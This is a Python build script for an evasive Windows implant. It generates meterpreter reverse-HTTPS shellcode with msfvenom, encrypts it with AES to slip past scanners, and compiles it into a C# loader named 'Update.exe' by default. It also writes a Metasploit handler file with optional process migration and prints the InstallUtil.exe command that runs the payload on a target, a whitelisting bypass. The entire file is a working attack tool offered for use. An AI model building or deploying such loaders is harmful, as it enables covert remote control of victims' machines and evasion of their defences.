#!/usr/bin/env python3

import argparse
import base64
import hashlib
import os
import re
import shutil
import subprocess
import sys

try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad
except ImportError:
    print("[-] Missing pycryptodome. Install: pip install pycryptodome")
    sys.exit(1)


class Color:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'


def info(msg):  print(f"{Color.BLUE}[*]{Color.END} {msg}")
def success(msg): print(f"{Color.GREEN}[+]{Color.END} {msg}")
def warn(msg):  print(f"{Color.YELLOW}[!]{Color.END} {msg}")
def error(msg): print(f"{Color.RED}[-]{Color.END} {msg}")


def check_dependencies(need_msfvenom):
    deps = {"mcs": "apt install mono-complete", "file": "apt install file"}
    if need_msfvenom:
        deps["msfvenom"] = "apt install metasploit-framework"

    missing = [(t, c) for t, c in deps.items() if shutil.which(t) is None]
    if missing:
        error("Missing required tools:")
        for t, c in missing:
            print(f"    - {t} (install: {c})")
        return False
    return True


def detect_arch_from_payload(payload):
    return "x64" if "x64" in payload else "x86"


def run_msfvenom(payload, lhost, lport, output_file, exitfunc="thread"):
    cmd = [
        "msfvenom", "-p", payload,
        f"LHOST={lhost}", f"LPORT={lport}", f"EXITFUNC={exitfunc}",
        "-f", "raw", "-o", output_file,
    ]
    info(f"Generating shellcode: {payload}")
    info(f"Command: {' '.join(cmd)}")
    print()

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    if result.returncode != 0:
        error(f"msfvenom returned error (exit code {result.returncode})")
        print(result.stderr)
        return None
    if result.stderr:
        print(result.stderr)

    with open(output_file, "rb") as f:
        shellcode = f.read()
    success(f"Shellcode generated: {len(shellcode)} bytes")
    return shellcode


def encrypt_aes256_cbc(shellcode):
    key = get_random_bytes(32)
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(shellcode, AES.block_size))
    info(f"Original size:  {len(shellcode)} bytes")
    info(f"Encrypted size: {len(ciphertext)} bytes")
    return (
        base64.b64encode(ciphertext).decode(),
        base64.b64encode(key).decode(),
        base64.b64encode(iv).decode(),
    )


def inject(content, output_path, ciphertext_b64, key_b64, iv_b64):
    patterns = [
        (r'string\s+encryptedShellcodeB64\s*=\s*"[^"]*";',
         f'string encryptedShellcodeB64 = "{ciphertext_b64}";'),
        (r'string\s+keyB64\s*=\s*"[^"]*";',
         f'string keyB64 = "{key_b64}";'),
        (r'string\s+ivB64\s*=\s*"[^"]*";',
         f'string ivB64 = "{iv_b64}";'),
    ]
    for pat, repl in patterns:
        if not re.search(pat, content):
            warn(f"Pattern not found: {pat}")
            return False
        content = re.sub(pat, repl, content)
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(content)
    success(f"Loader saved: {output_path}")
    return True


def compile_with_mono(source_file, output_exe, arch):
    cmd = [
        "mcs",
        f"-platform:{arch}",
        "-optimize+",
        "-target:exe",
        "-reference:System.dll,System.Core.dll,System.Security.dll,System.Configuration.Install.dll",
        f"-out:{output_exe}",
        source_file,
    ]
    info(f"Compiling ({arch}): {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    if result.returncode != 0:
        error("Compilation failed")
        print(result.stdout)
        print(result.stderr)
        return False
    if result.stderr and "warning" in result.stderr.lower():
        print(result.stderr)
    size = os.path.getsize(output_exe)
    success(f"Binary created: {output_exe} ({size} bytes)")
    return True


def generate_handler_rc(payload, lhost, lport, exitfunc, output_path, migrate=False):
    rc = f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set EXITFUNC {exitfunc}
set ExitOnSession false
"""
    if migrate:
        rc += "set AutoRunScript post/windows/manage/migrate\n"
    rc += "exploit -j\n"
    with open(output_path, "w") as f:
        f.write(rc)
    success(f"Handler resource file: {output_path}")
    info(f"Start handler: msfconsole -q -r {output_path}")


def binary_info(exe_path):
    size = os.path.getsize(exe_path)
    try:
        result = subprocess.run(["file", exe_path], capture_output=True, text=True, timeout=5)
        file_type = result.stdout.split(":", 1)[1].strip() if ":" in result.stdout else "N/A"
    except Exception:
        file_type = "N/A"
    try:
        with open(exe_path, "rb") as f:
            sha256 = hashlib.sha256(f.read()).hexdigest()
    except Exception:
        sha256 = "N/A"
    print()
    print(f"{Color.CYAN}{'='*70}{Color.END}")
    print(f"{Color.BOLD}BINARY INFO{Color.END}")
    print(f"{Color.CYAN}{'='*70}{Color.END}")
    print(f"File:    {exe_path}")
    print(f"Size:    {size} bytes ({size/1024:.2f} KB)")
    print(f"Type:    {file_type}")
    print(f"SHA256:  {sha256}")
    print(f"{Color.CYAN}{'='*70}{Color.END}")


def main():
    parser = argparse.ArgumentParser(description="InstallUtil loader builder")
    parser.add_argument("-l", "--lhost", default=None, help="LHOST")
    parser.add_argument("-p", "--lport", default="443", help="LPORT (default 443)")
    parser.add_argument("--payload", default="windows/x64/meterpreter/reverse_https",
                        help="Msfvenom payload (default meterpreter x64 HTTPS)")
    parser.add_argument("--exitfunc", default="thread",
                        choices=["thread", "process", "seh"])
    parser.add_argument("--shellcode", default=None,
                        help="Path to raw shellcode file (skip msfvenom)")
    parser.add_argument("--loader", default="./InstallUtilLoader.cs",
                        help="Path to InstallUtilLoader.cs")
    parser.add_argument("-o", "--output", default="Update",
                        help="Output name without .exe (default Update)")
    parser.add_argument("--migrate", action="store_true")
    parser.add_argument("--no-handler", action="store_true")
    args = parser.parse_args()

    if args.shellcode is None and args.lhost is None:
        parser.error("--lhost is required when not using --shellcode")

    print(f"\n{Color.BOLD}{Color.CYAN}=== InstallUtil Loader Builder ==={Color.END}\n")

    need_msfvenom = args.shellcode is None
    if not check_dependencies(need_msfvenom):
        sys.exit(1)

    arch = detect_arch_from_payload(args.payload)

    if not os.path.exists(args.loader):
        error(f"File {args.loader} does not exist")
        sys.exit(1)
    with open(args.loader, "r", encoding="utf-8") as f:
        loader_content = f.read()

    info("Configuration:")
    print(f"    Payload:   {args.payload}")
    print(f"    Arch:      {arch}")
    print(f"    LHOST:     {args.lhost}")
    print(f"    LPORT:     {args.lport}")
    print(f"    Loader:    {args.loader}")
    print(f"    Output:    {args.output}.exe")
    print()

    if args.shellcode:
        if not os.path.exists(args.shellcode):
            error(f"Shellcode file not found: {args.shellcode}")
            sys.exit(1)
        with open(args.shellcode, "rb") as f:
            shellcode = f.read()
        success(f"Loaded {len(shellcode)} bytes from {args.shellcode}")
        shellcode_file = None
    else:
        shellcode_file = "/tmp/shellcode.bin"
        shellcode = run_msfvenom(
            args.payload, args.lhost, args.lport, shellcode_file, args.exitfunc)
        if shellcode is None:
            sys.exit(1)

    print()
    info("Encrypting with AES-256-CBC (fresh key + IV)...")
    ciphertext_b64, key_b64, iv_b64 = encrypt_aes256_cbc(shellcode)

    print()
    info("Injecting into InstallUtilLoader.cs...")
    output_cs = f"{args.output}_Loader.cs"
    if not inject(loader_content, output_cs, ciphertext_b64, key_b64, iv_b64):
        sys.exit(1)

    print()
    output_exe = f"{args.output}.exe"
    if not compile_with_mono(output_cs, output_exe, arch):
        sys.exit(1)
    binary_info(output_exe)

    if not args.no_handler and args.shellcode is None:
        print()
        rc_path = f"{args.output}_handler.rc"
        generate_handler_rc(args.payload, args.lhost, args.lport,
                            args.exitfunc, rc_path, args.migrate)

    if shellcode_file and os.path.exists(shellcode_file):
        os.remove(shellcode_file)

    framework = "Framework64" if arch == "x64" else "Framework"
    print()
    success("Done!")
    print()
    print(f"{Color.BOLD}Run on target:{Color.END}")
    print(f"  {Color.CYAN}C:\\Windows\\Microsoft.NET\\{framework}\\v4.0.30319\\InstallUtil.exe "
          f"/logfile= /LogToConsole=false /U C:\\Users\\Public\\{args.output}.exe{Color.END}")
    print()
    warn(f"Use the ABSOLUTE path to InstallUtil.exe (NOT just 'InstallUtil.exe').")
    warn(f"Arch must match: x64 payload -> Framework64, x86 payload -> Framework.")
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        warn("Interrupted by user")
        sys.exit(130)
